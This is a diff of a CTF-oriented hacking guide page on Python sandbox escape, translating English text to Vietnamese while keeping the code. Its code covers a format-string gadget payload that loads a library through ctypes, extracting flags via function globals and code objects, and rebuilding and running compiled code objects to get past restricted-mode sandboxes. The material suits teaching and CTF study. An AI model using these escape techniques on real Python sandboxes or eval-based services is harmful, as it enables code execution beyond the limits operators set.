 
-Looking for a gadget like that in python, the writeup purposes this [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Where he found this [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
+Để tìm một gadget như vậy trong Python, writeup đề xuất truy vấn [**tìm kiếm trên Github này**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Tác giả đã tìm thấy [mục này](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
 
 ```python
 class LibraryLoader(object):
@@ -888,22 +888,22 @@ cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
 
-This gadget allows to **load a library from disk**. Therefore, it's needed to somehow **write or upload the library to load** correctly compiled to the attacked server.
+Gadget này cho phép **tải thư viện từ đĩa**. Vì vậy, cần phải **ghi hoặc tải thư viện lên** máy chủ bị tấn công, với thư viện được biên dịch chính xác.
 
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
 
-The challenge actually abuses another vulnerability in the server that allows to create arbitrary files in the servers disk.
+Thử thách thực chất khai thác một lỗ hổng khác trên máy chủ, cho phép tạo các tệp tùy ý trên ổ đĩa của máy chủ.
 
-## Dissecting Python Objects
+## Phân tích các đối tượng Python
 
 > [!TIP]
-> If you want to **learn** about **python bytecode** in depth read this **awesome** post about the topic: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> Nếu muốn **tìm hiểu** sâu về **bytecode Python**, hãy đọc bài viết **tuyệt vời** này về chủ đề đó: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-In some CTFs you could be provided with the name of a **custom function where the flag** resides and you need to see the **internals** of the **function** to extract it.
+Trong một số CTF, bạn có thể được cung cấp tên của một **hàm tùy chỉnh chứa flag** và cần xem **nội bộ** của **hàm** để trích xuất flag.
 
-This is the function to inspect:
+Đây là hàm cần kiểm tra:
 
 ```python
 def get_flag(some_input):
@@ -927,7 +927,7 @@ dir(get_flag) #Get info tof the function
 
 #### globals
 
-`__globals__` and `func_globals`(Same) Obtains the global environment. In the example you can see some imported modules, some global variables and their content declared:
+`__globals__` và `func_globals` (giống nhau) lấy môi trường toàn cục. Trong ví dụ, bạn có thể thấy một số module đã import, một số biến toàn cục và nội dung của chúng đã được khai báo:
 
 ```python
 get_flag.func_globals
@@ -938,11 +938,11 @@ get_flag.__globals__
 CustomClassObject.__class__.__init__.__globals__
 ```
 
-[**See here more places to obtain globals**](#globals-and-locals)
+[**Xem thêm các vị trí để lấy globals tại đây**](#globals-and-locals)
 
-### **Accessing the function code**
+### **Truy cập mã của hàm**
 
-**`__code__`** and `func_code`: You can **access** this **attribute** of the function to **obtain the code object** of the function.
+**`__code__`** và `func_code`: Bạn có thể **truy cập** **thuộc tính** này của hàm để **lấy đối tượng mã** của hàm.
 
 ```python
 # In our current example
@@ -958,7 +958,7 @@ dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
 
-### Getting Code Information
+### Lấy thông tin về mã nguồn
 
 ```python
 # Another example
@@ -1006,7 +1006,7 @@ get_flag.__code__.co_code
 'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
 ```
 
-### **Disassembly a function**
+### **Disassembly một hàm**
 
 ```python
 import dis
@@ -1036,7 +1036,7 @@ dis.dis(get_flag)
              47 RETURN_VALUE
 ```
 
-Notice that **if you cannot import `dis` in the python sandbox** you can obtain the **bytecode** of the function (`get_flag.func_code.co_code`) and **disassemble** it locally. You won't see the content of the variables being loaded (`LOAD_CONST`) but you can guess them from (`get_flag.func_code.co_consts`) because `LOAD_CONST`also tells the offset of the variable being loaded.
+Lưu ý rằng **nếu bạn không thể import `dis` trong sandbox Python**, bạn có thể lấy **bytecode** của hàm (`get_flag.func_code.co_code`) rồi **disassemble** nó trên máy cục bộ. Bạn sẽ không thấy nội dung của các biến được nạp (`LOAD_CONST`), nhưng có thể suy đoán chúng từ (`get_flag.func_code.co_consts`), vì `LOAD_CONST` cũng cho biết offset của biến đang được nạp.
 
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
@@ -1060,10 +1060,10 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
          47 RETURN_VALUE
 ```
 
-## Compiling Python
+## Biên dịch Python
 
-Now, let us imagine that somehow you can **dump the information about a function that you cannot execute** but you **need** to **execute** it.\
-Like in the following example, you **can access the code object** of that function, but just reading the disassemble you **don't know how to calculate the flag** (_imagine a more complex `calc_flag` function_).<sup>[[3]](#references)</sup>
+Giờ hãy tưởng tượng rằng bằng cách nào đó bạn có thể **dump thông tin về một hàm mà bạn không thể thực thi**, nhưng bạn **cần** **thực thi** hàm đó.\
+Như trong ví dụ sau, bạn **có thể truy cập code object** của hàm đó, nhưng chỉ đọc phần disassemble thì bạn **không biết cách tính flag** (_hãy tưởng tượng một hàm `calc_flag` phức tạp hơn_).<sup>[[3]](#references)</sup>
 
 ```python
 def get_flag(some_input):
@@ -1078,9 +1078,9 @@ def get_flag(some_input):
         return "Nope"
 ```
 
-### Creating the code object
+### Tạo code object
 
-First of all, we need to know **how to create and execute a code object** so we can create one to execute our function leaked:
+Trước hết, chúng ta cần biết **cách tạo và thực thi một code object** để có thể tạo một object nhằm thực thi function đã leak của chúng ta:
 
 ```python
 code_type = type((lambda: None).__code__)
@@ -1102,7 +1102,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 
 > [!TIP]
-> Depending on the python version the **parameters** of `code_type` may have a **different order**. The best way to know the order of the params in the python version you are running is to run:
+> Tùy thuộc vào phiên bản Python, các **tham số** của `code_type` có thể có **thứ tự khác nhau**. Cách tốt nhất để biết thứ tự các tham số trong phiên bản Python bạn đang chạy là chạy:
 >
 > ```
 > import types
@@ -1110,10 +1110,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### Recreating a leaked function
+### Tái tạo một hàm leak
 
 > [!WARNING]
-> In the following example, we are going to take all the data needed to recreate the function from the function code object directly. In a **real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
+> Trong ví dụ sau, chúng ta sẽ lấy trực tiếp từ code object của hàm tất cả dữ liệu cần thiết để tái tạo hàm. Trong một **ví dụ thực tế**, tất cả **giá trị** cần để thực thi hàm **`code_type`** là những gì **bạn sẽ cần leak**.
 
 ```python
 fc = get_flag.__code__
@@ -1126,12 +1126,12 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
 
-### Bypass Defenses
+### Vượt qua các cơ chế phòng vệ
 
-In previous examples at the beginning of this post, you can see **how to execute any python code using the `compile` function**. This is interesting because you can **execute whole scripts** with loops and everything in a **one liner** (and we could do the same using **`exec`**).\
-Anyway, sometimes it could be useful to **create** a **compiled object** in a local machine and execute it in the **CTF machine** (for example because we don't have the `compiled` function in the CTF).
+Trong các ví dụ trước ở phần đầu bài viết này, bạn có thể thấy **cách thực thi bất kỳ mã Python nào bằng hàm `compile`**. Điều này rất thú vị vì bạn có thể **thực thi toàn bộ script** có vòng lặp và mọi thứ khác trong **một dòng** (và chúng ta cũng có thể làm tương tự bằng **`exec`**).\
+Dù vậy, đôi khi việc **tạo** một **đối tượng đã biên dịch** trên máy cục bộ rồi thực thi nó trên **máy CTF** có thể hữu ích (ví dụ: vì chúng ta không có hàm `compiled` trong CTF).
 
-For example, let's compile and execute manually a function that reads _./poc.py_:
+Ví dụ, hãy biên dịch và thực thi thủ công một hàm đọc _./poc.py_:
 
 ```python
 #Locally
@@ -1160,7 +1160,7 @@ codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module
 function_type(codeobj, mydict, None, None, None)()
 ```
 
-If you cannot access `eval` or `exec` you could create a **proper function**, but calling it directly is usually going to fail with: _constructor not accessible in restricted mode_. So you need a **function not in the restricted environment to call this function.**
+Nếu không thể truy cập `eval` hoặc `exec`, bạn có thể tạo một **hàm đúng nghĩa**, nhưng gọi trực tiếp thường sẽ thất bại với lỗi: _constructor not accessible in restricted mode_. Vì vậy, bạn cần một **hàm nằm ngoài môi trường bị hạn chế** để gọi hàm này.
 
 ```python
 #Compile a regular print
@@ -1170,23 +1170,23 @@ f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdi
 f(42)
 ```
 
-## Decompiling Compiled Python
+## Giải mã Python đã biên dịch
 
-Using tools like [**https://www.decompiler.com/**](https://www.decompiler.com) one can **decompile** given compiled python code.
+Sử dụng các công cụ như [**https://www.decompiler.com/**](https://www.decompiler.com), ta có thể **giải mã** mã Python đã biên dịch.
 
-**Check out this tutorial**:
+**Xem hướng dẫn này**:
 
 
 {{#ref}}
 ../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
 {{#endref}}
 
-## Misc Python
+## Python linh tinh
 
 ### Assert
 
-Python executed with optimizations with the param `-O` will remove asset statements and any code conditional on the value of **debug**.\
-Therefore, checks like the following:<sup>[[6]](#references)</sup>
+Python được thực thi với chế độ tối ưu hóa bằng tham số `-O` sẽ loại bỏ các câu lệnh assert và mọi đoạn mã phụ thuộc vào giá trị của **debug**.\
+Do đó, các kiểm tra như sau:<sup>[[6]](#references)</sup>
 
 ```python
 def check_permission(super_user):
@@ -1197,25 +1197,24 @@ def check_permission(super_user):
         print(f"\nNot a Super User!!!\n")
 ```
 
-will be bypassed
+sẽ bị bypass
 
 ## References
 
 - [1] [Pyjail](https://lbarman.ch/blog/pyjail/)
-- [2] [Python Sandbox Escape - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
-- [3] [Escaping a Python sandbox (NdH 2013 quals writeup)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
-- [4] [Python 'sandbox' escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
-- [5] [Eval really is dangerous](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
-- [6] [How Assertions Can Get You Hacked](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-- [7] [CVE-2023-33733 (ReportLab rl_safe_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
-- [8] [c53elyas/CVE-2023-33733 PoC and write-up](https://github.com/c53elyas/CVE-2023-33733)
-- [9] [0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
-- [10] [0xdf: HTB Interpreter – Mirth Connect XStream RCE, Mirth hash cracking, and Flask f-string eval privilege escalation](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
-- [11] [SECCON CTF 2022 Quals: Author writeups (English)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
-- [12] [Anatomy of an LLM RCE - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
-- [13] [BuckeyeCTF 2024 Author Writeups](https://corgi.rip/posts/buckeye-writeups/)
-- [14] [GeeksforGeeks – Vulnerability in str.format() in Python](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
+- [2] [Thoát khỏi Python Sandbox - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
+- [3] [Thoát khỏi sandbox Python (bài viết về vòng loại NdH 2013)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
+- [4] [Thoát khỏi Python 'sandbox'](https://gynvael.coldwind.pl/n/python_sandbox_escape)
+- [5] [Eval thực sự nguy hiểm](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
+- [6] [Assertions có thể khiến bạn bị hack như thế nào](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
+- [7] [CVE-2023-33733 (RCE khi đánh giá biểu thức rl_safe_eval của ReportLab) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
+- [8] [PoC và bài viết về c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
+- [9] [0xdf: University (HTB) – Khai thác CVE-2023-33733 của xhtml2pdf/ReportLab để đạt RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
+- [10] [0xdf: HTB Interpreter – RCE Mirth Connect XStream, bẻ khóa hash Mirth và leo thang đặc quyền bằng Flask f-string eval](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
+- [11] [SECCON CTF 2022 Quals: Bài viết của tác giả (tiếng Anh)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
+- [12] [Giải phẫu một vụ LLM RCE - Blog nghiên cứu mối đe dọa của CyberArk](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
+- [13] [Bài viết của tác giả BuckeyeCTF 2024](https://corgi.rip/posts/buckeye-writeups/)
+- [14] [GeeksforGeeks – Lỗ hổng trong str.format() của Python](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
 - [15] [ur4ndom – GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
-- [16] [checkoway.net - Musings - Pickle](https://checkoway.net/musings/pickle)
-
+- [16] [checkoway.net - Suy ngẫm - Pickle](https://checkoway.net/musings/pickle)
 {{#include ../../../banners/hacktricks-training.md}}
